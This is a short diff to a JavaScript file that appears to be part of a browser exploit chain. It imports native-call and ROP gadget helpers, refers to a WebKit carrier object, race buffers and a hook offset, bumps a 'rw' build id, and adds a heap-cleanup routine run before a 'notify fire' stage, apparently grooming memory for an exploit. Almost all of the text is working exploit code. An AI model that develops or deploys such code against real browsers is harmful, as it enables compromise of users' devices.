@@ -88,7 +88,7 @@ import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, 
     prepGadgetRvaStale, refreshPrepSlabGadgets,
     CHAIN_POP_ROWS } from "./native_call.js";
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830bq";
+const BUILD_ID = "rw-20250830br";
 
 const NATIVE_BISECT_STEPS = [
     { id: "smoke-now", label: "N0 getpid", title: "getpid — hook cell+0x30 default (13.52; ?hook=cell for poops +0)" },
@@ -5210,6 +5210,11 @@ async function runFireNotify() {
             notifyStage("NOTIFY-F02-SKIP", trimErr && trimErr.message ? trimErr.message : "trim skip");
         }
 
+        notifyStage("NOTIFY-F02b", "freeHeapBeforeNotifyFire");
+        freeHeapBeforeNotifyFire();
+        if (notifyPrep && notifyPrep.arenaMode !== true)
+            notifyPrep = null;
+
         if (!notifyPrep) {
             await ensureNotifyPrep(p, off);
             if (!notifyPrep) {
@@ -5362,6 +5367,21 @@ async function freeBeforeNative() {
     if (mapBody) mapBody.innerHTML = "";
     if (outEl) outEl.textContent = lines.join("\n");
     exploit = null;
+}
+
+/** Drop rw_demo retain junk before notify fire — keep collator pin + carrier. */
+function freeHeapBeforeNotifyFire() {
+    const keep = notifyRetain.slice();
+    const ta = window._wkCarrier && window._wkCarrier.textarea;
+    nativePrep = null;
+    nativeStaged = false;
+    pointers.length = 0;
+    raceBuf.length = 0;
+    retained.length = 0;
+    for (let i = 0; i < keep.length; i++) retained.push(keep[i]);
+    if (ta) retained.push(ta);
+    if (lines.length > 14) lines.splice(0, lines.length - 14);
+    if (mapBody) mapBody.innerHTML = "";
 }
 
 function seedNativeSession(p, off) {
